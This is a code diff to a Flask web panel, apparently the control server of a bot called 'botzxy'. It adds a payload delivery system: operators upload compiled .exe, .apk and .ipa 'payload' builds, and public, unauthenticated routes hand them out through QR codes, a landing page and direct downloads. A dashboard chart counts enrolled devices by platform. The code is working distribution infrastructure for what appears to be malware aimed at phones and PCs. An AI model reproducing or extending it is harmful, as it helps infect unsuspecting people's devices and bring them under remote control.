@@ -1,4 +1,6 @@
-from flask import Flask, request, jsonify, render_template, send_from_directory
+from flask import Flask, request, jsonify, render_template, send_from_directory, send_file
+import io
+import qrcode
 from flask_socketio import SocketIO
 from flask_cors import CORS
 from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
@@ -45,6 +47,54 @@ socketio = SocketIO(app, cors_allowed_origins="*")
 login_manager = LoginManager()
 login_manager.init_app(app)
 login_manager.login_view = 'login'
+
+# ============ CARTELLA BUILD / DELIVERY ============
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+BUILDS_DIR = os.path.join(BASE_DIR, 'builds')
+os.makedirs(BUILDS_DIR, exist_ok=True)
+
+PLATFORM_EXT = {'windows': '.exe', 'android': '.apk', 'ios': '.ipa'}
+PLATFORM_LABEL = {'windows': 'Windows', 'android': 'Android', 'ios': 'iPhone'}
+
+def resolve_payload(platform):
+    """Risolve il path del payload compilato per la piattaforma richiesta."""
+    if platform not in PLATFORM_EXT:
+        return None
+    candidates = {
+        'windows': [
+            os.path.join(BUILDS_DIR, 'botzxy_windows.exe'),
+            os.path.join(BASE_DIR, 'dist', 'botzxy_client.exe'),
+        ],
+        'android': [
+            os.path.join(BUILDS_DIR, 'botzxy_android.apk'),
+        ],
+        'ios': [
+            os.path.join(BUILDS_DIR, 'botzxy_ios.ipa'),
+        ],
+    }
+    for c in candidates.get(platform, []):
+        if os.path.exists(c):
+            return c
+    # Fallback: cerca nella cartella dist/ per estensione
+    dist_dir = os.path.join(BASE_DIR, 'dist')
+    if os.path.isdir(dist_dir):
+        for fn in os.listdir(dist_dir):
+            if fn.lower().endswith(PLATFORM_EXT[platform]):
+                return os.path.join(dist_dir, fn)
+    return None
+
+def sha256_file(path):
+    h = hashlib.sha256()
+    with open(path, 'rb') as f:
+        for chunk in iter(lambda: f.read(65536), b''):
+            h.update(chunk)
+    return h.hexdigest()
+
+def build_deploy_url(platform):
+    url = request.host_url.rstrip('/') + '/d/' + platform
+    if 'onrender.com' in url:
+        url = url.replace('http://', 'https://')
+    return url
 
 # ============ SERVIRE FILE STATICI ============
 @app.route('/static/<path:filename>')
@@ -992,6 +1042,91 @@ def internal_error(error):
 def handle_exception(e):
     import traceback
     return traceback.format_exc(), 500
+
+# ============ QR / DELIVERY ============
+@app.route('/qr')
+@login_required
+def qr_page():
+    return render_template('qr.html')
+
+@app.route('/qr_img/<platform>')
+def qr_img(platform):
+    if platform not in PLATFORM_EXT:
+        return jsonify({'error': 'invalid platform'}), 404
+    deploy_url = build_deploy_url(platform)
+    img = qrcode.make(deploy_url)
+    buf = io.BytesIO()
+    img.save(buf, format='PNG')
+    buf.seek(0)
+    return send_file(buf, mimetype='image/png', download_name=f'botzxy_{platform}.png')
+
+@app.route('/d/<platform>')
+def landing(platform):
+    if platform not in PLATFORM_EXT:
+        return "Invalid platform", 404
+    return render_template('landing.html', platform=platform, label=PLATFORM_LABEL.get(platform, platform))
+
+@app.route('/download/<platform>')
+def download_payload(platform):
+    path = resolve_payload(platform)
+    if not path:
+        return f"Payload non disponibile per {PLATFORM_LABEL.get(platform, platform)}. Carica il file dalla pagina /qr.", 404
+    return send_file(path, as_attachment=True, download_name=os.path.basename(path))
+
+@app.route('/api/payloads', methods=['GET'])
+@login_required
+def get_payloads():
+    result = {}
+    for p in PLATFORM_EXT:
+        path = resolve_payload(p)
+        info = {'available': bool(path), 'platform': p, 'label': PLATFORM_LABEL.get(p, p)}
+        if path:
+            st = os.stat(path)
+            info['filename'] = os.path.basename(path)
+            info['size'] = st.st_size
+            info['size_mb'] = round(st.st_size / (1024 * 1024), 2)
+            info['modified'] = datetime.fromtimestamp(st.st_mtime).isoformat()
+            info['sha256'] = sha256_file(path)
+            info['download_url'] = f'/download/{p}'
+            info['deploy_url'] = build_deploy_url(p)
+        result[p] = info
+    return jsonify(result)
+
+@app.route('/api/upload_payload', methods=['POST'])
+@login_required
+def upload_payload():
+    platform = request.form.get('platform')
+    if platform not in PLATFORM_EXT:
+        return jsonify({'error': 'invalid platform'}), 400
+    f = request.files.get('file')
+    if not f or not f.filename:
+        return jsonify({'error': 'nessun file ricevuto'}), 400
+    fname = f'botzxy_{platform}{PLATFORM_EXT[platform]}'
+    os.makedirs(BUILDS_DIR, exist_ok=True)
+    dest = os.path.join(BUILDS_DIR, fname)
+    f.save(dest)
+    log_action('system', 'payload_uploaded', f'Payload {platform} caricato: {fname} ({os.path.getsize(dest)} bytes)')
+    return jsonify({'status': 'uploaded', 'filename': fname, 'size': os.path.getsize(dest)})
+
+# ============ GRAFICO PIATTAFORME (fix dashboard) ============
+@app.route('/api/chart/platforms', methods=['GET'])
+@login_required
+def get_platform_chart():
+    if not supabase:
+        return jsonify({'labels': [], 'data': [], 'colors': []})
+    try:
+        result = supabase.table('devices').select('platform').execute()
+        counts = {}
+        for d in (result.data or []):
+            p = (d.get('platform') or 'unknown').lower()
+            counts[p] = counts.get(p, 0) + 1
+        colors = {'windows': '#3b82f6', 'android': '#34d399', 'ios': '#a78bfa', 'unknown': '#64748b'}
+        labels = list(counts.keys())
+        data = [counts[k] for k in labels]
+        cl = [colors.get(k, '#8b5cf6') for k in labels]
+        return jsonify({'labels': labels, 'data': data, 'colors': cl})
+    except:
+        return jsonify({'labels': [], 'data': [], 'colors': []})
 
 # ============ MAIN ============
 if __name__ == '__main__':
